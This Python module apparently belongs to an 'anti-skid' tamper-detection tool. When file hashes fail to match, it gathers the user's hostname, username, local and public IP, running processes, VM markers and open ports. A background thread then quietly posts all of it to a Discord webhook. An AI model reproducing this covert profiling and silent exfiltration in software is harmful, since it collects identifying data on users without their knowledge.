# builds the breach report and ships it to discord
# runs in a background thread so it doesnt slow anything down
# if no webhook it just dumps to stderr whatever

import json
import os
import sys
import threading
import urllib.request
import datetime

from .environment import sniff_everything

MAX_LEN = 1000  # discord dont like long messages


def _chop(text: str, max_len: int = MAX_LEN) -> str:
    # cuts text if its too long
    if len(text) <= max_len:
        return text
    return text[: max_len - 30] + "\n\n... [chopped]"


def _fmt_mismatches(mismatches: list) -> str:
    # makes a readable list of hash mismatches
    if not mismatches:
        return "none lol"
    lines = []
    for m in mismatches:
        lines.append(f"- {m['path']}")
        lines.append(f"  expected: {m['expected'][:16]}...")
        lines.append(f"  got:      {m['actual'][:16]}...")
        lines.append("")
    return _chop("\n".join(lines))


def build_report(audit: dict) -> str:
    # builds the whole breach report as a text file
    now = datetime.datetime.utcnow().isoformat() + "Z"

    env = sniff_everything()
    host = env.get("host", {})
    ports = env.get("ports", {})
    discord = env.get("discord_process", "???")
    vm = env.get("container_vm", {})

    out = []

    out.append("=" * 64)
    out.append("  ANTI SKID BREACH REPORT")
    out.append("=" * 64)
    out.append(f"time: {now}")
    out.append(f"passed: {audit['passed']}")
    out.append(f"took: {audit['elapsed_ms']}ms")
    out.append(f"total files: {audit['total_files']}")
    out.append(f"matched: {audit['matched']}")
    out.append(f"mismatches: {len(audit['mismatches'])}")
    out.append(f"missing: {len(audit['missing'])}")
    out.append(f"new/unknown: {len(audit['new_files'])}")

    if audit.get("error"):
        out.append(f"\n!! audit error: {audit['error']}")

    # mismatches section
    out.append("\n" + "-" * 64)
    out.append("  FILES THAT GOT TOUCHED")
    out.append("-" * 64)
    out.append(_fmt_mismatches(audit["mismatches"]))

    if audit.get("missing"):
        out.append("\n-- MISSING FILES --")
        for m in audit["missing"]:
            out.append(f"  - {m}  [deleted or renamed]")

    if audit.get("new_files"):
        out.append("\n-- NEW / UNTRACKED FILES --")
        for nf in audit["new_files"]:
            out.append(f"  - {nf}")

    # host info
    out.append("\n" + "-" * 64)
    out.append("  WHO GOT CAUGHT")
    out.append("-" * 64)
    out.append(f"hostname: {host.get('hostname', '???')}")
    out.append(f"username: {host.get('username', '???')}")
    out.append(f"local ip: {host.get('local_ip', '???')}")
    out.append(f"public ip: {host.get('public_ip', '???')}")
    out.append(f"platform: {host.get('platform', '???')}")
    out.append(f"python: {host.get('python_version', '???')}")

    # env markers
    out.append("\n" + "-" * 64)
    out.append("  ENVIRONMENT")
    out.append("-" * 64)
    out.append(f"discord open: {discord}")
    out.append(f"docker env file: {vm.get('docker_env_file', False)}")
    out.append(f"docker cgroup: {vm.get('docker_cgroup', False)}")
    out.append(f"virtualbox: {vm.get('vbox', False)}")
    out.append(f"vmware: {vm.get('vmware', False)}")
    out.append(f"qemu: {vm.get('qemu', False)}")

    # ports
    out.append("\n" + "-" * 64)
    out.append("  PORTS (localhost)")
    out.append("-" * 64)
    if ports:
        for pl, status in sorted(ports.items()):
            out.append(f"  {pl:<20} {status}")
    else:
        out.append("  (none)")

    out.append("\n" + "=" * 64)
    out.append("  END")
    out.append("=" * 64)

    return "\n".join(out)


# --------------- discord webhook ---------------

def _send_discord(webhook_url: str, report: str) -> bool:
    # sends the report as a .txt file to a discord webhook
    boundary = "----antisKidBoundary"

    parts = []

    # json payload
    payload = json.dumps({
        "content": ":warning: **ANTI SKID BREACH**",
        "username": "anti-skid",
    })
    parts.append(f"--{boundary}")
    parts.append('Content-Disposition: form-data; name="payload_json"')
    parts.append("Content-Type: application/json")
    parts.append("")
    parts.append(payload)

    # file part
    ts = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    fname = f"breach_{ts}.txt"
    parts.append(f"--{boundary}")
    parts.append(f'Content-Disposition: form-data; name="file"; filename="{fname}"')
    parts.append("Content-Type: text/plain")
    parts.append("")
    parts.append(report)

    parts.append(f"--{boundary}--")
    parts.append("")

    body = "\r\n".join(parts).encode("utf-8")
    ct = f"multipart/form-data; boundary={boundary}"

    req = urllib.request.Request(
        webhook_url,
        data=body,
        headers={"Content-Type": ct, "User-Agent": "anti-skid/1.0"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return 200 <= resp.status < 300
    except:
        return False


def report_breach(webhook_url, audit):
    # builds report and fires it off in the background
    if not webhook_url:
        webhook_url = os.environ.get("ANTI_SKID_WEBHOOK")

    report_text = build_report(audit)

    if not webhook_url:
        print("\n[anti-skid] no webhook set, here's the report:\n", file=sys.stderr)
        print(report_text, file=sys.stderr)
        return

    # fire and forget in a thread
    def _send():
        ok = _send_discord(webhook_url, report_text)
        if not ok:
            print("[anti-skid] failed to send webhook rip", file=sys.stderr)

    t = threading.Thread(target=_send, daemon=True, name="anti-skid-webhook")
    t.start()